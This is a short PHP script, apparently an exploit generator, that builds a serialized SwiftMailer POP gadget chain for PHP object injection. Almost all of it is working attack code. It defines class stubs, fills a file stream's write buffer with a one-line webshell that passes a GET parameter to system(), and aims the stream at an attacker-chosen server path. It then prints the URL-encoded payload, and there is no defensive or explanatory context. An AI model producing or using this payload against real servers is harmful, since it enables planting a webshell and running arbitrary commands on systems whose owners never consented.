<?php
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{}
class Swift_Events_SimpleEventDispatcher{}
class Swift_Transport_SendmailTransport {
    public $buffer;
    public $started;
    public $eventDispatcher;
}
abstract class Swift_ByteStream_AbstractFilterableInputStream {
    private $filters = [];
    private $writeBuffer = '<?php system($_GET["c"]); ?>//'; // simple webshell
}


if ($argc != 2) {
    echo "Usage: php $argv[0] <remote_path>\n";
    exit;
}

$remote_path = $argv[1];

$obj = new Swift_Transport_SendmailTransport();
$obj->buffer = new Swift_ByteStream_FileByteStream();
$obj->buffer->path = $remote_path;
$obj->buffer->mode = "w+";
$obj->started = true;
$obj->eventDispatcher = new Swift_Events_SimpleEventDispatcher();
$payload = serialize($obj);

echo "[+] SwiftMailer POP chain to write file at remote: $remote_path\n";
echo "[+] urlencode(\$payload):\n";
echo urlencode($payload) . "\n";